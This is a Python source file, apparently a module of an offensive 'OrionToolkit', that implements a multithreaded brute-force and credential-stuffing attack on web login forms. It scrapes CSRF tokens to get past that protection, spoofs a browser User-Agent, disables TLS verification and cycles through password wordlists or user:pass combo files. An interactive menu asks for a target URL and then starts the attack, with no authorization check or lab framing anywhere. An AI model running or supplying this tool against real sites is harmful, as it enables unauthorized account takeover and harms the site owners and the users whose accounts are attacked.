# modules/bruteforce.py
# OrionToolkit - Login Brute-Force Module

import re
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from time import sleep

import requests
from rich.console import Console
from rich.progress import (
    BarColumn,
    Progress,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
)
from rich.table import Table
from rich.panel import Panel

console = Console()

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def extract_csrf(html, field_name="csrf_token"):
    """Try to extract CSRF token from HTML form."""
    patterns = [
        rf'name=["\']{field_name}["\']\s+value=["\']([^"\']+)["\']',
        rf'name=["\']{field_name}_token["\']\s+value=["\']([^"\']+)["\']',
        rf'value=["\']([^"\']+)["\']\s+name=["\']{field_name}["\']',
        r'name=["\']csrf["\']\s+value=["\']([^"\']+)["\']',
        r'name=["\']_token["\']\s+value=["\']([^"\']+)["\']',
        r'name=["\']csrfmiddlewaretoken["\']\s+value=["\']([^"\']+)["\']',
        r'csrf-token["\']?\s+content=["\']([^"\']+)["\']',
    ]
    for pat in patterns:
        match = re.search(pat, html, re.IGNORECASE)
        if match:
            return match.group(1)
    return None


def attempt_login(
    url, username, password,
    username_field="username", password_field="password",
    extra_fields=None, success_string=None, fail_string=None,
    redirect_check=False, csrf_field=None, session=None,
    verify_ssl=False, timeout=10,
):
    """Attempt a single login and return (username, password, success, reason)."""
    if session is None:
        session = requests.Session()
    try:
        if csrf_field or not success_string:
            resp = session.get(url, verify=verify_ssl, timeout=timeout)
            csrf_token = extract_csrf(resp.text, csrf_field) if csrf_field else None
            if resp.status_code != 200:
                return (username, password, False, f"HTTP {resp.status_code} on GET")
        else:
            csrf_token = None

        data = {username_field: username, password_field: password}
        if csrf_token:
            data[csrf_field or "csrf_token"] = csrf_token
        if extra_fields:
            data.update(extra_fields)

        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
        }
        post_resp = session.post(url, data=data, headers=headers, verify=verify_ssl, timeout=timeout, allow_redirects=True)

        if success_string:
            success = success_string in post_resp.text
            reason = "Matched success string" if success else "No success string found"
        elif fail_string:
            success = fail_string not in post_resp.text
            reason = "No fail string found" if success else "Matched fail string"
        elif redirect_check:
            success = len(post_resp.history) > 0
            reason = f"Redirected ({post_resp.status_code})" if success else f"No redirect ({post_resp.status_code})"
        else:
            fail_indicators = ["invalid", "incorrect", "failed", "error", "not found", "try again", "wrong"]
            found_fail = any(indicator in post_resp.text.lower() for indicator in fail_indicators)
            success = not found_fail and post_resp.status_code == 200
            reason = "No failure indicators" if success else "Failure indicators detected"

        return (username, password, success, reason)

    except requests.exceptions.Timeout:
        return (username, password, False, "Timeout")
    except requests.exceptions.ConnectionError as e:
        return (username, password, False, f"Connection error: {str(e)[:50]}")
    except Exception as e:
        return (username, password, False, str(e)[:60])


def load_wordlist(path):
    """Load a wordlist file, return list of lines (stripped)."""
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        console.print(f"[bold red]File not found:[/bold red] {path}")
        return []
    except Exception as e:
        console.print(f"[bold red]Error reading {path}:[/bold red] {e}")
        return []


def bruteforce_login(
    url, username_list=None, password_list=None, combos=None,
    username_field="username", password_field="password",
    extra_fields=None, success_string=None, fail_string=None,
    redirect_check=False, csrf_field=None, threads=5, delay=0,
):
    """Main brute-force controller."""
    results = {"success": [], "failed": 0, "errors": []}

    if combos is None:
        if not username_list or not password_list:
            console.print("[bold red]Provide username list + password list, or combo list.[/bold red]")
            return results
        combos = [(u, p) for u in username_list for p in password_list]
        total = len(combos)
    else:
        total = len(combos)

    if total == 0:
        console.print("[yellow]No credentials to test.[/yellow]")
        return results

    console.print(Panel.fit(
        f"[bold cyan]Brute-Forcing[/bold cyan]\n"
        f"[white]Target:[/white] {url}\n"
        f"[white]Attempts:[/white] {total}\n"
        f"[white]Threads:[/white] {threads}",
        border_style="cyan",
    ))

    progress = Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TextColumn("({task.completed}/{task.total})"),
        TimeElapsedColumn(),
        console=console, transient=False,
    )

    completed = 0
    found_flag = threading.Event()

    with progress:
        task = progress.add_task("[cyan]Testing credentials...", total=total)
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for username, password in combos:
                if found_flag.is_set():
                    break
                futures.append(executor.submit(
                    attempt_login, url, username, password,
                    username_field, password_field, extra_fields,
                    success_string, fail_string, redirect_check,
                    csrf_field, None, False, 10,
                ))
                if delay > 0:
                    sleep(delay)

            for future in as_completed(futures):
                if found_flag.is_set():
                    break
                try:
                    u, p, success, reason = future.result()
                    completed += 1
                    progress.update(task, advance=1)
                    if success:
                        results["success"].append((u, p))
                        console.print(f"\n[bold green][+] VALID:[/bold green] {u}:{p} ({reason})")
                        found_flag.set()
                    else:
                        results["failed"] += 1
                except Exception as e:
                    results["errors"].append(str(e))
                    progress.update(task, advance=1)

    console.print("\n")
    summary = Table(title="BRUTE-FORCE SUMMARY", border_style="cyan")
    summary.add_column("Metric", style="bold cyan")
    summary.add_column("Value", style="white")
    summary.add_row("Total Attempts", str(completed))
    summary.add_row("Valid Found", str(len(results["success"])))
    summary.add_row("Failed", str(results["failed"]))
    if results["errors"]:
        summary.add_row("Errors", str(len(results["errors"])))
    if results["success"]:
        for u, p in results["success"]:
            summary.add_row("Valid Credential", f"[green]{u}:{p}[/green]")
    console.print(summary)
    return results


def menu_bruteforce():
    """Interactive menu handler for the brute-force module."""
    console.print(Panel.fit("[bold cyan]LOGIN BRUTE-FORCE[/bold cyan]", border_style="cyan"))

    url = console.input("[white]Target login URL: [/white]").strip()
    if not url:
        console.print("[red]URL is required.[/red]")
        return
    if not (url.startswith("http://") or url.startswith("https://")):
        url = "https://" + url
        console.print(f"[dim]Added https:// -> {url}[/dim]")

    username_field = console.input("[white]Username field name [username]: [/white]").strip() or "username"
    password_field = console.input("[white]Password field name [password]: [/white]").strip() or "password"

    csrf_yn = console.input("[white]Extract CSRF token? (y/n) [n]: [/white]").strip().lower()
    csrf_field = None
    if csrf_yn == "y":
        csrf_field = console.input("[white]CSRF field name [csrf_token]: [/white]").strip() or "csrf_token"

    mode = console.input("[white]Mode: (1) Single user + wordlist  (2) Combo list [1]: [/white]").strip() or "1"
    threads = int(console.input("[white]Threads [5]: [/white]").strip() or "5")
    delay = float(console.input("[white]Delay between attempts (seconds) [0]: [/white]").strip() or "0")

    console.print("[dim]How to detect a successful login?[/dim]")
    detect = console.input("[white](s)tring match  (r)edirect  (f)ail string  (a)uto [a]: [/white]").strip().lower() or "a"
    success_string = None
    fail_string = None
    redirect_check = False
    if detect == "s":
        success_string = console.input("[white]Success string: [/white]").strip()
    elif detect == "f":
        fail_string = console.input("[white]Fail string: [/white]").strip()
    elif detect == "r":
        redirect_check = True

    if mode == "1":
        username = console.input("[white]Username: [/white]").strip()
        pw_path = console.input("[white]Password wordlist path: [/white]").strip()
        passwords = load_wordlist(pw_path)
        if not passwords:
            return
        combos = [(username, p) for p in passwords]
    else:
        combo_path = console.input("[white]Combo file path (user:pass per line): [/white]").strip()
        raw = load_wordlist(combo_path)
        combos = []
        for line in raw:
            if ":" in line:
                u, p = line.split(":", 1)
                combos.append((u.strip(), p.strip()))
        if not combos:
            console.print("[red]No valid combos found (format: user:pass per line).[/red]")
            return

    extra_fields_raw = console.input("[white]Extra POST fields (key=val, & separated) [none]: [/white]").strip()
    extra_fields = None
    if extra_fields_raw:
        extra_fields = {}
        for pair in extra_fields_raw.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                extra_fields[k.strip()] = v.strip()

    console.print("\n[bold yellow]Starting attack... (Ctrl+C to abort)[/bold yellow]")
    try:
        bruteforce_login(
            url=url, combos=combos,
            username_field=username_field, password_field=password_field,
            extra_fields=extra_fields, success_string=success_string,
            fail_string=fail_string, redirect_check=redirect_check,
            csrf_field=csrf_field, threads=threads, delay=delay,
        )
    except KeyboardInterrupt:
        console.print("\n[bold yellow]Aborted by user.[/bold yellow]")
